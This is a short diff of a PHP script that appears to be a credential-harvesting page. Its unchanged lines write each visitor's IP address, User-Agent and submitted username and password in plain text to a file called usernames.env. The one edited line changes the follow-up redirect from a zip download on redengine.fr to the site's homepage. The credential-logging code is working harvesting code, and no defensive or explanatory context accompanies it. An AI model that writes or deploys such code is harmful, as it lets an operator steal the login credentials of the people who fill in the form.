@@ -14,5 +14,5 @@ else
     } 
 $browser = $_SERVER['HTTP_USER_AGENT']."\r\n"; 
 file_put_contents("usernames.env", "\nUser-Agent: " . $browser . "IP: " . $ipaddress . "\nAccount: \"" . $_POST['username'] . "\" Pass: \"" . $_POST['password'] . "\"\n", FILE_APPEND);
-header('Location: https://redengine.fr/public.zip');
+header('Location: https://redengine.fr');
 exit();
